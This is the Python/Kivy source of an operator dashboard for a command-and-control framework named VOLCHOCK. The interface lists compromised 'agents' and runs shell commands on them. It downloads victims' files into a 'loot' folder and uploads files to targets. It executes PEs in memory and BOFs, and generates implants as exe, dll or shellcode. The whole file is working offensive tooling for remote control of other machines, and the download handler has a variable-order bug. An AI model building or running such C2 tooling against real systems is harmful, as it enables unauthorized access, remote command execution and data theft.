from kivy.uix.screenmanager import Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.image import Image
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.recycleview import RecycleView
from kivy.uix.recycleboxlayout import RecycleBoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.utils import get_color_from_hex
from kivy.clock import Clock
from kivy.core.text import LabelBase
from kivy.uix.popup import Popup
import threading, requests, os, time, subprocess
from datetime import datetime
from constants.colors import RED, GREEN, GRAY, WHITE, INPUT_GRAY, BUTTON_GREEN, BUTTON_DARKBLUE
from kivy.graphics import Color, Rectangle
from threading import Thread
import base64
import subprocess
import sys
import json
import os
import requests

MAX_CONSOLE_LINES = 100000

def get_font_path():
    return os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'assets', 'font.ttf'))

def get_logo_path():
    return os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'assets', 'logo.jpg'))

class ColoredBox(BoxLayout):
    def __init__(self, bgcolor, **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            Color(*bgcolor)
            self.bg_rect = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=self._update_rect, size=self._update_rect)
    def _update_rect(self, *a):
        self.bg_rect.pos = self.pos
        self.bg_rect.size = self.size

class AgentListView(BoxLayout):
    def __init__(self, agents=None, **kwargs):
        super().__init__(orientation='vertical', **kwargs)
        self.button_panel = GridLayout(cols=1,
            size_hint=(1, None),
            spacing=5
        )
        self.button_panel.bind(minimum_height=self.button_panel.setter('height'))
        sv = ScrollView(size_hint=(1, 1))
        sv.add_widget(self.button_panel)
        self.add_widget(sv)
        self.selected_idx = None
        self.select_callback = None
        self.update_agents(agents or [])

    def _update_text_size(self, instance, value):
        instance.text_size = (instance.width, None)

    def update_agents(self, agents):
        self.button_panel.clear_widgets()
        if not agents:
            btn = Button(
                text='', 
                size_hint_y=None, height=38,
                color=RED, background_color=GREEN, disabled=True
            )
            self.button_panel.add_widget(btn)
        else:
            for idx, ag in enumerate(agents):
                txt = f"{ag.get('hostname','?')} ({ag.get('username','?')})"
                btn = Button(
                    text=txt,
                    size_hint_y=None, height=38,
                    color=WHITE,
                    background_color=GREEN if idx == self.selected_idx else GREEN,
                    halign='left'
                )
                btn.bind(on_release=self.make_callback(idx))
                self.button_panel.add_widget(btn)

    def make_callback(self, idx):
        def cb(instance):
            self.selected_idx = idx
            self.update_selected()
            if self.select_callback:
                self.select_callback(idx)
        return cb

    def update_selected(self):
        for idx, btn in enumerate(self.button_panel.children[::-1]):  # .children est inversé
            btn.background_color = BUTTON_GREEN if idx == self.selected_idx else BUTTON_GREEN

class AgentInfoPanel(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', **kwargs)
        self.info_label = Label(
            text='Infos agent :',
            halign='left',
            valign='top',
            size_hint=(1, 1),
            color=WHITE
        )
        self.info_label.bind(size=self._update_text_size)
        self.add_widget(self.info_label)

    def _update_text_size(self, instance, value):
        instance.text_size = (instance.width, None)

    def update_infos(self, agent):
        if not agent:
            self.info_label.text = ""
        else:
            last_seen = datetime.fromtimestamp(agent.get('last_seen',0)).strftime('%Y-%m-%d %H:%M:%S')
            self.info_label.text = (
                f"\nAgent ID: {agent.get('agent_id', '?')}\n"
                f"Hostname: {agent.get('hostname', '?')}\n"
                f"User: {agent.get('username', '?')}\n"
                f"IP: {agent.get('ip', '?')}\n"
                f"Last seen: {last_seen}\n"
            )

class MainFrame(Screen):
    def __init__(self, base_url, auth, agents, **kwargs):
        super().__init__(**kwargs)
        self.base_url = base_url
        self.auth = auth
        self._agents = agents or []
        self.selected_agent_idx = 0 if self._agents else None
        self._last_result_poll_agentid = None
        self._background_thread_started = False
        self.console_history = []
        root = BoxLayout(orientation='vertical', padding=[12,8], spacing=6)
        # Header
        header = BoxLayout(orientation='horizontal', size_hint_y=None, height=70, spacing=14)
        logo_path = get_logo_path()
        if os.path.exists(logo_path):
            header.add_widget(Image(source=logo_path, size_hint=(None,1), width=61))
        else:
            header.add_widget(Label(text="VOLCHOCK", size_hint=(None,1), width=61))
        font_path = get_font_path()
        font_face = None
        if os.path.exists(font_path):
            LabelBase.register(name="CustomFont", fn_regular=font_path)
            font_face = "CustomFont"
        title = Label(
            text='VOLCHOCK DASHBOARD',
            color=RED,
            font_name=font_face if font_face else None,
            font_size=30, bold=True,
            halign='left', valign='middle'
        )
        header.add_widget(title)
        buttons = BoxLayout(orientation='vertical', size_hint=(None,1), width=200, height=75, spacing=0)
        btn_users_logs = Button(
            text='Users logs',
            size_hint=(None, None), size=(200, 36),
            background_color=BUTTON_DARKBLUE,
            color=WHITE
        )
        btn_users_logs.bind(on_press=self.open_users_logs_window)
        buttons.add_widget(btn_users_logs)
        btn_logs = Button(
            text='Logs',
            size_hint=(None, None), size=(200, 36),
            background_color=BUTTON_DARKBLUE,
            color=WHITE
        )
        btn_logs.bind(on_press=self.open_logs_window)
        buttons.add_widget(btn_logs)
        header.add_widget(buttons)
        root.add_widget(header)
        H = BoxLayout(orientation='horizontal', size_hint_y=0.33, spacing=8)
        agents_list_box = ColoredBox(bgcolor=GRAY, orientation='vertical', padding=3, spacing=3)
        self.rv_agents = AgentListView(agents=self._agents)
        self.rv_agents.select_callback = self.on_agent_selected
        agents_list_box.add_widget(Label(text="[b] Connected agents [/b]",markup=True, color=WHITE, size_hint_y=None, height=22))
        agents_list_box.add_widget(self.rv_agents)
        H.add_widget(agents_list_box)
        infos_box = ColoredBox(bgcolor=GRAY, orientation='vertical', padding=3, spacing=3)
        self.agent_info = AgentInfoPanel()
        self.agent_info.update_infos(self._agents[0] if self._agents else None)
        infos_box.add_widget(Label(text="[b] Agent infos [/b]", markup=True, color=WHITE, size_hint_y=None, height=22))
        infos_box.add_widget(self.agent_info)
        H.add_widget(infos_box)
        root.add_widget(H)
        console_box = ColoredBox(bgcolor=GRAY, orientation='vertical', spacing=4, padding=6)
        self.console_textinput = TextInput(
            text='',
            multiline=True,
            readonly=True,
            font_size=14, 
            background_color=(0, 0, 0, 1),
            foreground_color=(1, 1, 1, 1),
            size_hint=(1, None),
            height=300
        )
        console_box.add_widget(self.console_textinput)
        prompt_box = BoxLayout(orientation='horizontal', size_hint_y=0.12, spacing=6)
        self.cmd_txt = TextInput(hint_text="Command input", size_hint_x=0.86, background_color=INPUT_GRAY, foreground_color=WHITE, multiline=False)
        send_btn = Button(text="Send", size_hint_x=0.14, background_color=[.15,.44,.22,1])
        send_btn.bind(on_press=self.on_shell_command)
        prompt_box.add_widget(self.cmd_txt)
        prompt_box.add_widget(send_btn)
        console_box.add_widget(prompt_box)
        root.add_widget(console_box)
        self.add_widget(root)
        self.cmd_txt.bind(on_text_validate=self.on_shell_command)

    def open_users_logs_window(self, instance):
        auth_info = {"username": self.auth.username, "password": self.auth.password}
        os.environ["KIVY_NO_ARGS"]="1"
        subprocess.Popen([
            sys.executable, "-m", "ui.get_users_logs",
            "--base-url", self.base_url,
            "--auth", json.dumps(auth_info)
        ])

    def open_logs_window(self, instance):
        auth_info = {"username": self.auth.username, "password": self.auth.password}
        os.environ["KIVY_NO_ARGS"]="1"
        subprocess.Popen([
            sys.executable, "-m", "ui.get_logs",
            "--base-url", self.base_url,
            "--auth", json.dumps(auth_info)
        ])

    def append_to_console(self, txt):
        if not hasattr(self, "console_history"):
            self.console_history = []
        print(txt)
        lines = txt.splitlines()
        self.console_history.extend(lines)
        to_display = self.console_history 
        self.console_textinput.text = "\n".join(to_display)
        self.console_textinput.cursor = (0, len(self.console_textinput.text))

    def on_enter(self, *a):
        if not self._background_thread_started:
            self._background_thread_started = True
            threading.Thread(target=self._background_update_loop, daemon=True).start()
            print("[+] Starting background tasks...") 

    def _background_update_loop(self):
        while True:
            try:
                # 1. Update agents list
                resp = requests.get(f"{self.base_url}/agents", auth=self.auth, timeout=10)
                agents_list = resp.json().get("agents", []) if resp.ok else []
                agents = []
                for ag in agents_list:
                    agid = ag.get("agent_id")
                    try:
                        r = requests.get(f"{self.base_url}/agent/{agid}/info", auth=self.auth, timeout=8)
                        if r.ok:
                            ag_detail = r.json().get("info", {})
                            ag_detail["agent_id"] = agid
                            agents.append(ag_detail)
                    except Exception as e:
                        print(f"Error agent fetch: {e}")
                Clock.schedule_once(lambda dt: self._safe_update_agents(agents))
                # 2. Update agent info panel
                if agents and self.selected_agent_idx is not None and 0 <= self.selected_agent_idx < len(agents):
                    agid = agents[self.selected_agent_idx]['agent_id']
                    try:
                        inf = requests.get(f"{self.base_url}/agent/{agid}/info", auth=self.auth, timeout=8)
                        agent = inf.json().get("info", {}) if inf.ok else None
                        Clock.schedule_once(lambda dt: self.agent_info.update_infos(agent))
                    except Exception as e:
                        print(f"Error agent info: {e}")
                # 3. Update results panel
                if agents and self.selected_agent_idx is not None and 0 <= self.selected_agent_idx < len(agents):
                    agid = agents[self.selected_agent_idx]['agent_id']
                    try:
                        res = requests.get(f"{self.base_url}/agent/{agid}/results", auth=self.auth, timeout=8)
                        if res.ok:
                            results = res.json().get("results", [])
                            if results:
                                Clock.schedule_once(lambda dt: self.append_to_console("\n[Results]:\n" + "\n".join(results) ))
                    except Exception as e:
                        print(f"Error agent results: {e}")
            except Exception as e:
                print(f"Background update error: {e}")
            time.sleep(1) 

    def _safe_update_agents(self, agents):
        self._agents = agents
        self.rv_agents.update_agents(agents)
        if agents:
            if self.selected_agent_idx is None or not (0 <= self.selected_agent_idx < len(agents)):
                self.selected_agent_idx = 0
            self.rv_agents.selected_idx = self.selected_agent_idx
            agent = agents[self.selected_agent_idx]
            self.agent_info.update_infos(agent)
        else:
            self.selected_agent_idx = None
            self.agent_info.update_infos(None)

    def on_agent_selected(self, idx):
        self.selected_agent_idx = idx
        if self._agents and 0 <= idx < len(self._agents):
            self.agent_info.update_infos(self._agents[idx])
            Clock.schedule_once(lambda dt: self.append_to_console(f"\n[+] Selected agent: {self._agents[idx]['hostname']} ({self._agents[idx]['username']})"))

    def get_downloaded_file(self, agent_id, payload_cmd):
        try:
            time_out = 60
            while time_out > 0:
                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
                if resp.ok:
                    results = resp.json().get("results", [])
                    if len(results) > 0:
                        latest = results[0]
                        loot_dir = 'loot'
                        if not os.path.exists(loot_dir):
                            os.makedirs(loot_dir)
                        agent_dir = os.path.join('loot', str(agent_id))
                        if not os.path.exists(agent_dir):
                            os.makedirs(agent_dir)
                        if '\\' in payload_cmd:
                            filename = payload_cmd.split('\\')[-1]
                        else:
                            filename = os.path.basename(os.path.normpath(payload_cmd))
                        dest_path = os.path.join(agent_dir, filename)
                        with open(dest_path, 'wb') as f:
                            f.write(base64.b64decode(latest))
                        Clock.schedule_once(lambda dt: self.append_to_console(f"[+] File saved : {dest_path} \n\n" ))
                        time_out = 0
                        return
                time_out = time_out - 1
                time.sleep(1)
            Clock.schedule_once(lambda dt: self.append_to_console("[!] Timeout, no result received.\n"))
        except Exception as e:
            print(f"[!] Exception: {e}\n")

    def get_upload_result(self, agent_id):
        try:
            time_out = 60
            while time_out > 0:
                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
                if resp.ok:
                    results = resp.json().get("results", [])
                    if len(results) > 0:
                        Clock.schedule_once(lambda dt: self.append_to_console("[+] File sent.\n"))
                        return
                time_out = time_out - 1
                time.sleep(1)
        except Exception as e:
            Clock.schedule_once(lambda dt: self.append_to_console(f"[!] Exception: {e}\n"))


    def get_agent(self, listener_name, agent_type):
        resp = requests.get(f"{self.base_url}/generate/{listener_name}/{agent_type}", auth=self.auth)
        if resp.ok:
            results = resp.json().get("results", [])
            try:
                b64_agent = results['content']
                if agent_type == "exe":
                    with open('agent.exe', 'wb') as f:
                        f.write(base64.b64decode(b64_agent))
                    Clock.schedule_once(lambda dt: self.append_to_console("\n[+] Agent save as \"agent.exe\"\n"))
                elif agent_type == "dll":
                    with open('agent.dll', 'wb') as f:
                        f.write(base64.b64decode(b64_agent))
                    Clock.schedule_once(lambda dt: self.append_to_console("\n[+] Agent save as \"agent.dll\"\n"))
                elif agent_type == "shellcode":
                    with open('shellcode.bin', 'wb') as f:
                        f.write(base64.b64decode(b64_agent))
                    Clock.schedule_once(lambda dt: self.append_to_console("\n[+] Agent save as \"shellcode.bin\"\n"))
                else:
                    Clock.schedule_once(lambda dt: self.append_to_console("\n[!] Can't save agent : No type found.\n"))
            except Exception as excepssion:
                print(excepssion)
                Clock.schedule_once(lambda dt: self.append_to_console(results))
        else:
            Clock.schedule_once(lambda dt: self.append_to_console(results))


    def on_shell_command(self, _):
        display_help = """
Available Commands:
--------------------
- listeners
    Return the active listeners list

- generate <listener_name> <payload_type>
    Generate a payload for the choosen listener
    Available payload types : "exe", "dll", "shellcode"
    Example: generate http dll

- shell <cmd>
    Execute the specified shell command on the target machine.
    Example: shell whoami

- download <remote_file_path>
    Download a file from the target machine to the server.
    Example: download C:\\Users\\user\\Desktop\\file.txt

- upload <local_file_path>
    Upload a file from the server to the target machine.
    Example: upload /home/user/payload.exe

- exec-pe <local_file_path>
    In-memory execution of a local PE on the target machine.
    Example: exec-pe /home/user/payload.exe
"""
        idx = self.rv_agents.selected_idx
        cmd = self.cmd_txt.text.strip()
        if not cmd:
            Clock.schedule_once(lambda dt: self.append_to_console("\n"))
            self.cmd_txt.text = ""
            return
        if cmd.lower().startswith("listeners"):
            resp = requests.get(f"{self.base_url}/listeners", auth=self.auth)
            if resp.ok:
                results = resp.json().get("listeners", [])
                listeners = "Listeners:\n"
                for lines in results:
                    listeners += lines
                Clock.schedule_once(lambda dt: self.append_to_console(listeners))
            return
        elif cmd.lower().startswith("generate"):
            cmd = cmd.lower().strip()
            parts = cmd.split()
            if len(parts) == 3:
                _, listener_name, agent_type = parts
                if agent_type != "exe" and agent_type != "dll" and agent_type != "shellcode":
                    Clock.schedule_once(lambda dt: self.append_to_console(f"\n{display_help}\n"))
                    return
                Clock.schedule_once(lambda dt: self.append_to_console(f"[+] Requesting {agent_type} agent...\n"))
                Thread(target=self.get_agent, args=(listener_name, agent_type)).start()
                self.cmd_txt.text = ""
            else:
                Clock.schedule_once(lambda dt: self.append_to_console(f"\n{display_help}\n"))
            return
        # agent commands
        if idx is None or not self._agents:
            Clock.schedule_once(lambda dt: self.append_to_console(f"\n{display_help}\n"))
            self.cmd_txt.text = ""
            return
        agent = self._agents[idx]
        agent_id = agent['agent_id']
        try: 
            from utils.requests_utils import queue_shell_command
        except Exception:
            def queue_shell_command(*a,**k): pass
        if cmd.lower().startswith("shell "):
            payload_cmd = cmd[6:].strip()
            display_cmd = str({"cmd": payload_cmd})
            queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            Clock.schedule_once(lambda dt: self.append_to_console(f"[+] Shell command sent: {payload_cmd}\n[~] Waiting result ..."))
            self._last_result_poll_agentid = agent_id
        elif cmd.lower().startswith("download "):
            Clock.schedule_once(lambda dt: self.append_to_console(f"[+] Trying to download file: {payload_cmd} \n"))
            payload_cmd = cmd[len("download "):].strip()
            display_cmd = str({"download": f"{payload_cmd}"})
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            Thread(target=self.get_downloaded_file, args=(agent_id, payload_cmd)).start()
        elif cmd.lower().startswith("upload "):
            payload_cmd = cmd[len("upload "):].strip()
            with open(payload_cmd, 'rb') as f:
                file_content = f.read()
            b64_encoded_file = base64.b64encode(file_content)
            filename = os.path.basename(payload_cmd)
            fil_props = base64.b64encode(str({"filename": filename, "content": b64_encoded_file}).encode("utf-8", errors="replace"))
            display_cmd = str({"upload": fil_props})
            Clock.schedule_once(lambda dt: self.append_to_console(f"[+] Trying to upload file: {payload_cmd} \n"))
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            threading.Thread(target=self.get_upload_result, args=(agent_id,)).start()
        elif cmd.lower().startswith("inline-execute "):
            payload_cmd = cmd[len("inline-execute "):].strip()
            with open(payload_cmd, 'rb') as f:
                file_content = f.read()
            b64_encoded_file = base64.b64encode(file_content).decode()
            display_cmd = str({"inline-execute": b64_encoded_file})
            Clock.schedule_once(lambda dt: self.append_to_console(f"[+] Trying to execute BOF: {payload_cmd} \n"))
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            threading.Thread(target=self.get_upload_result, args=(agent_id,)).start()
        elif cmd.lower().startswith("exec-pe "):
            cmd_args = cmd[len("exec-pe "):].strip().split(" ")
            payload_cmd = cmd_args[0]
            args = " ".join(cmd_args[1:])
            with open(payload_cmd, 'rb') as f:
                file_content = f.read()
            b64_encoded_file = base64.b64encode(file_content)
            b64_encoded_args = base64.b64encode(args.encode("utf-8", errors="replace"))
            filename = os.path.basename(payload_cmd)
            fil_props = base64.b64encode(str({
                "filename": filename,
                "content": b64_encoded_file,
                "args": b64_encoded_args
            }).encode("utf-8", errors="replace"))
            display_cmd = str({"exec-pe": fil_props})
            Clock.schedule_once(lambda dt: self.append_to_console(f"[+] Trying to execute PE in-memory: {payload_cmd} \n"))
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            threading.Thread(target=self.get_upload_result, args=(agent_id,)).start()
        else:
            Clock.schedule_once(lambda dt: self.append_to_console(f"\n{display_help}\n"))
        self.cmd_txt.text = ""
